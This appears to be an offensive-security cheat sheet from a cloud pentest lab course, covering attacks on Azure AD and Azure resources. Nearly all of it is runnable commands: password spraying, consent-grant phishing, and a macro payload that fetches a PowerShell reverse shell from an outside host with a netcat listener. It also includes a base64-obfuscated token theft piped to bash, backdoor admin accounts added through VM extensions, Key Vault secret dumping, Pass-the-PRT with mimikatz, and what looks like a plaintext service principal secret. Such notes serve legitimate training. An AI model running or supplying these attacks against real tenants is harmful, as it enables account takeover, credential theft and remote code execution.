# Azure AD

## Recon

### Tenant

```powershell
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntLoginInformation -UserName admin@defcorphq.onmicrosoft.com
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
```

#### More info

```powershell
# Valid emails
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt
# Enumerate Subdomains
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1
# You can add hr, career, etc to Misc\permutations.txt
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

#### Password Spraying

```powershell
. C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1
Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password 'password' -Verbose
```

### MG Module

#### Login

```powershell
$passwd = ConvertTo-SecureString "password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
```

#### Enumerate

```powershell
# Users
Get-MgUser -All
Get-MgUser -All | select UserPrincipalName
# Groups
Get-MgGroup -All
# Devices
Get-MgDevice
# Get Global Administrators
$RoleId = (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
(Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId).AdditionalProperties
# List Custom Directory Roles
Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False} | select DisplayName
```

### Az Powershell

#### Login

```powershell
$passwd = ConvertTo-SecureString "password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
```

#### Recon

```powershell
# List all resources
Get-AzResource
# List the role assigment 
Get-AzRoleAssignment -SignInName test@defcorphq.onmicrosoft.com
# List vms
Get-AzVM | fl
# List app services
Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
# List Function Apps
Get-AzFunctionApp
# List storage accounts
Get-AzStorageAccount | fl
# List readable key vaults
Get-AzKeyVault
```

### az cli

```powershell
# Login
az login -u test@defcorphq.onmicrosoft.com -p password
# List vms
az vm list 
az vm list --query "[].[name]" -o table
# List webapps
az webapp list
az webapp list --query "[].[name]" -o table
# List functiona pps
az functionapp list --query "[].[name]" -o table
# List storage
az storage account list
# List key vault
az keyvault list
```

### StormSPotter

- https://github.com/Azure/Stormspotter

```bash
az login -u test@defcorphq.onmicrosoft.com -p password
python sscollector.pyz cli
```

### Bloodhound

- https://github.com/SpecterOps/BloodHound
- https://github.com/SpecterOps/AzureHound

#### Windows

##### Option 1

```powershell
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
$passwd = ConvertTo-SecureString "password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds
. C:\AzAD\Tools\AzureHound\AzureHound.ps1
Invoke-AzureHound -Verbose
```

##### Option 2

```powershell
# request device code
$body = @{
    "client_id" =     "1950a258-227b-4e31-a9cf-717495945fc2"
    "resource" =      "https://graph.microsoft.com"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers=@{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$authResponse
# Authenticate with device code and use the token
$body=@{
    "client_id" =  "1950a258-227b-4e31-a9cf-717495945fc2"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code" =       $authResponse.device_code
}
$Tokens = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$Tokens
./azurehound -r "0.ARwA6Wg..." list --tenant "contoso.onmicrosoft.com" -o output.json
```

#### Linux

```bash
./azurehound -u user@mail.com -p 'pass' -t <tenant id> -o output.json
```


## Exploitation

### Illicit Consent Grant Attack

- https://www.alteredsecurity.com/post/introduction-to-365-stealer
- https://github.com/trouble-1/vajra

We need:

1. External Tenant
2. In cases (Admin consent)

Steps:

1. Create an application `(Multitenant, web, Redirect to our ip server - https://ip/login/authorized)`
2. Copy the Application (client) ID
3. Generate secret and save value
4. Go to API Permissions and add Delegated Permissions MS Graph (read,files,etc)
5. Launch 365 steeler and set config
6. Send phishing link to victim
7. If you have read,write permissions to Onedrive you can upload a reverse shell into word document

```powershell
# RCE Macro doc
Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.x:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.x -Port 4444" -OutputFile studentx.doc
C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
```

```bash
# Also you can set on webapp
python 365-Stealer.py --set-config
python 365-Stealer.py --run-app
```

### Azure App Service

> We need rce to access to management identity with the header and request a token

Could be these vulnerabilities:

1. File Upload Vulnerability
2. SSTI
3. RCE

```bash
# For Linux
echo 'Y3VybCAiJElERU5USVRZX0VORFBPSU5UP3Jlc291cmNlPWh0dHBzOi8vZ3JhcGgubWljcm9zb2Z0LmNvbS8mYXBpLXZlcnNpb249MjAxNy0wOS0wMSIgLUggc2VjcmV0OiRJREVOVElUWV9IRUFERVI=' | base64 -d | bash
```

#### Management Azure

```powershell
env
# Get Token Azure
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

```powershell
$Token =  'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value
# Change URI to /resources after obtain subscription
# Example: https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01
# After /providers/Microsoft.Authorization/permissions 
# Example: https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01
```

### VM

#### Add user code

```powershell
$passwd = ConvertTo-SecureString "passs" -AsPlainText -Force
New-LocalUser -Name studentX -Password $passwd 
Add-LocalGroupMember -Group Administrators -Member studentx
```

#### Check permissions

```powershell
Get-AzResource
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
Get-AzADGroup -DisplayName 'VM Admins'
```

```powershell
Get-AzResourceGroup
Get-AzResourceGroupDeployment -ResourceGroupName SAP
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName SAP -DeploymentName stevencking_defcorphq.onmicrosoft.com.sapsrv

```

#### Info usres

```powershell
(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$Token =  'eyJ0..'
$URI = 'https://graph.microsoft.com/v1.0/users/VMContributor99@defcorphq.onmicrosoft.com/memberOf'
$RequestParams = @{
     Method  = 'GET'
     Uri     = $URI
     Headers = @{
         'Authorization' = "Bearer $Token"
     }
}
(Invoke-RestMethod @RequestParams).value
# Get info about unit id
Get-MgDirectoryAdministrativeUnit -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395
# Get members of aministrative unit
Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
# Get members of administrative unit
Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
# Get member of administrative unit
(Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395).RoleMemberInfo
# Get ROle of user
Get-MgDirectoryRole -DirectoryRoleId 5b3935ed-b52d-4080-8b05-3a1832194d3a
# Get info about user
Get-MgUser -UserId 8c088359-66fb-4253-ad0d-a91b82fd548a | fl *
```

#### Run Command

```powershell
Invoke-AzVMRunCommand `
    -ResourceGroupName "Engineering" `
    -VMName "bkpadconnect" `
    -CommandId "RunPowerShellScript" `
    -ScriptString "whoami"
# or script
Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
```

#### Extract IP

```powershell
Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile #Networkinterface
Get-AzNetworkInterface -Name bkpadconnect368 #IPCONFIGURSATION
Get-AzPublicIpAddress -Name bkpadconnectIP
```

#### Connnect Session

```powershell
$password = ConvertTo-SecureString 'pass' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('user', $Password)
$sess = New-PSSession -ComputerName <ip> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
```

#### Extract Secrets

```powershell
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
Get-AzResource
```

##### Check permissions

```powershell
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value
# Check extensions
Get-AzVMExtension -ResourceGroupName "Research" -VMName "infradminsrv"
# Execute extension
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users student99 Stud99Password@123 /add /Y; net localgroup administrators student99 /add"}'
```

#### Graph

```powershell
env
# Get Token Graph
curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

List enterprise Applications

```powershell
$Token =  'eyJ0eX..'
$URI = ' https://graph.microsoft.com/v1.0/applications'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value
```

##### Abuse Enterprise Applications

```powershell
. C:\AzAD\Tools\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $token -Verbose
```

### Storage

```powershell
# Recon
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1
# List possible blobs. Example: https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list
```

```powershell
Get-AzResource
Get-AzStorageContainer -Context (New-AzStorageContext -StorageAccountName defcorpcodebackup)
```

### SAS

> If you have a SAS URL you can use `Microsoft Azure Storage Explorer`

```
https://<storage_account>.blob.core.windows.net/<container_name>/<blob_name>?sv=2024-01-01&se=2024-12-31T23%3A59%3A59Z&sr=b&sp=rwdlacup&sig=abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890
```

With the token you can enumerate the permissions but by default Azure not show that 


### Automation Accounts

#### Using token

```powershell
az ad signed-in-user show 
az extension add --upgrade -n automation
az ad signed-in-user list-owned-objects 
# "displayName": "Automation Admins"
# Get token
az account get-access-token --resource-type ms-graph
$token = 'ey..'
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
```

Add user with the object id to the group to the groupo ID 

```powershell
$params = @{
     "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/<object id>"
}
New-MgGroupMemberByRef -GroupId <object ID> -BodyParameter $params
# or
New-MgGroupMember -GroupId <group object id> -DirectoryObjectId <user object id>
```

#### Exploiting

Using the user with the permissions "Automation Admins"

```bash
az account get-access-token
az account get-access-token --resource-type aad-graph
$AADToken = 'eyJ0…'
$AccessToken = 'eyJ0…'
Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId <user object ID>
# Check permissions. Also you can check with bloodhound CE
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
Import-AzAutomationRunbook -Name student99 -Path C:\AzAD\Tools\student99.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
Publish-AzAutomationRunbook -RunbookName student99 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
Start-AzAutomationRunbook -RunbookName student99 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

### Key Vaults

If you have a token with permissiont to key vault

#### Login

```bash
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER'
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER'
```

```powershell
Connect-AzAccount -AccessToken $token -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken
```

#### Extract

```powershell
Get-AzKeyVault
Get-AzKeyVaultSecret -VaultName ResearchKeyVault
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader –AsPlainText
```

### Enterrpise Applications

```powershell
Get-MgServicePrincipal -All | ?{$_.AppId -eq "62e44426-5c46-4e3c-8a89-f461d5d586f2"} | fl #Application client id 
```

#### Secrets

```powershell
$password = ConvertTo-SecureString '_1ATfh--GD.WBhRuP.H3p_iR~MX2W1OA6S' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f072c4a6-b440-40de-983f-a7f3bd317d8f', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 2d50cb29-5f7b-48a4-87ce-fe75a941adb6
```

### Pass the PRT Attack

```powershell
$TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"

$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
    "URI"     = $URL 
    "Method"  = "POST"
}

$Body = @{
    "grant_type" = "srv_challenge"
    }


$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
```

```powershell
Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student99\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\Users\Public\student99\SessionExecCommand.exe MichaelMBarron C:\Users\Public\student99\ROADToken.exe <codeNONCE> > C:\Users\Public\student99\PRT.txt"}
# or 
C:\Users\Public\student99\SessionExecCommand.exe MichaelMBarron C:\Users\Public\student99\ROADToken.exe <codeNONCE> > C:\Users\Public\student99\PRT.txt
```

#### Mimikatz

```powershell
Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student1\mimikatz.exe sekurlsa::cloudap exit}
# Decrypt using PRT and keyvalue
Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student1\mimikatz.exe "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"}
# Using prt and key decoded 
roadtx prt -a renew --prt <prt> --prt-sessionkey <clear key>
# Authenticate
roadtx browserprtauth -url https://portal.azure.com
# or roadtx prtauth -c azps -r azrm --tokens-stdout
```

Steps:

> Remember to use the nonce code just one time

1. Enter to https://login.microsoftonline.com/login.srf 
2. Clear all cookies
3. Add cookie 'x-ms-RefreshTokenCredential' with the value and enable HTTPOnly


### Intune Administrator

If you have Intune Administrator you can execute commandos on the workstations

1. Access to https://endpoint.microsoft.com/#home 
2. Go to Devices
3. Go to Scripts and Remediations
4. Go to Platform Scripts and add your script.ps1
5.  Script settings (Using logged on Credentials: No, Enfoce Script: No, 64 bit Powershell: Yes)
6. Assignments: Add All Users



## References

- https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/
- https://blog.netwrix.com/2023/05/13/pass-the-prt-overview/
- https://aadinternals.com/post/prt/
- https://github.com/morRubin/PrtToCert
- https://github.com/morRubin/AzureADJoinedMachinePTC